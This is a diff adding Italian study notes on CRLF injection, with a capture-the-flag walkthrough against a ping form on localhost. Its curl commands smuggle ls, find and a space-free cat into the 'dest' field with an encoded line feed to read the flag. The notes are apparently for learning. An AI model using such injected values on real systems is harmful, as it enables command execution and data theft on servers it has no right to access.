@@ -185,3 +185,54 @@ palle = {"allowed_flag":"sos", "palle1":"palle2"}
 str = "flag: %(allowed_flag)s" % palle
 print(str)     #stampa "flag: sos"
 ```
+
+------------------------
+
+### CRLF Injection
+
+<b>CR</b> = Carriage Return (\r) → Codifica HEX: 0x0d, <b>Codifica URL: %0d</b>
+
+<b>LF</b> = Line Feed (\n) → Codifica HEX: 0x0a, <b>Codifica URL: %0a</b>
+
+
+La combinazione di CRLF è l'effetto del tasto ENTER.
+
+Torna molto utile la codifica URL di CR ed LF per esempio per le Injection.
+
+<br>
+Esempio di esercizio:
+
+```html
+<html>
+<head><title>Can I haz Smart Cat ???</title></head>
+<body>
+  <h3> Smart Cat debugging interface </h3>
+
+  <form method="post" action="index.cgi">
+    <p>Ping destination: <input type="text" name="dest"/></p>
+  </form>
+  <p>Ping results:</p><br/>
+  <pre></pre>
+</body>
+</html>
+```
+In cui si richiedeva di trovare la flag a partire da questa pagina dove era possibile effettuare "solamente" il ping. Utilizzare spazi, &&, || e altri comandi di altri tipo risulta inutile in quanto il codice ne previene l'uso.
+
+Se si visualizza il pacchetto POST, nel body si trova dest=indirizzo ip, dove dest sta a identificare l'argomento presente nell'inputbox. Sfruttando il comando curl, possiamo ri-effettuare il comando, scrivendo dest=ipaddr<b>%0a</b>ls. 
+```sh
+#ls tramite Line feed
+curl -XPOST -d 'dest=0.0.0.0%0als' 'http://localhost:8090/'
+```
+Una volta inviato, da terminale appare l'effetto del ping e il ritorno di ls (in questo caso consiste di un file python e della cartella there). Siccome non sono accettati spazi di alcuni tipo, l'unico modo è utilizzare il comando <b>find</b> per analizzare tutte le sottocartelle, trovando così la posizione della flag.
+```sh
+#find tramite Line feed
+curl -XPOST -d 'dest=0.0.0.0%0afind' 'http://localhost:8090/'
+```
+
+Infine, per utilizzare il cat senza spazi, utilizziamo il comando col redirect, ovvero
+```sh
+cat<path/to/flag.txt
+
+#Caso particolare dell'esercizio
+curl -XPOST -d 'dest=0.0.0.0%0acat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag' 'http://localhost:8090/'
+```
